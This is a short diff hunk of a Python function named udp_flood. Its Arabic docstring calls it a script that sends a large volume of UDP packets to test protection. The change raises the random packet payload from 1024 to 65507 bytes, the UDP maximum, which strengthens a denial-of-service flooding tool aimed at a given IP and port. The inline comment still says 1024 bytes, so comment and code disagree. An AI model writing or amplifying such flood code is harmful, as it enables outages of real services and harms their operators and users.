@@ -7,7 +7,7 @@ def udp_flood(target_ip, target_port, duration):
     سكربت لإرسال كمية كبيرة من حزم UDP لاختبار الحماية.
     """
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    packet = random._urandom(1024)  # إنشاء حزمة بحجم 1024 بايت
+    packet = random._urandom(65507)  # إنشاء حزمة بحجم 1024 بايت
     timeout = time.time() + duration
     sent_packets = 0
 
